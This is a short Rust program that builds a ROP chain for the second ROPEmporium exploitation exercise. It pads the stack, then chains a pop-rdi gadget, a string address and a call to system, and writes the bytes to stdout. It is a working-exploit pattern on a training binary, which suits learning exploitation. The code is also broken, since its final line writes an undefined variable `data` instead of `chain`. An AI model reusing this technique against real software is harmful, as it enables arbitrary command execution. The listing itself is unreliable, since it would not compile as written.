/*
 * This program produces a ROP chain to beat the 2nd exercise in ROPEmporium.
 * The general technique is in rop-chain.rs
 */

use std::{io, mem};
use std::io::Write;

fn main() {
    let pop_rdi: u64 = 0x00400883;
    let addr_cat: u64 = 0x00601060;
    let call_system: u64 = 0x00400810;

    const SIZE: usize = 8;
    let chain: [u64; SIZE] = [
        0, 0, 0, 0, 0,
        pop_rdi,
        addr_cat,
        call_system,
    ];

    let chain: [u8; SIZE * 8] = unsafe { mem::transmute(chain) };
    let _ = io::stdout().write(&data);
}

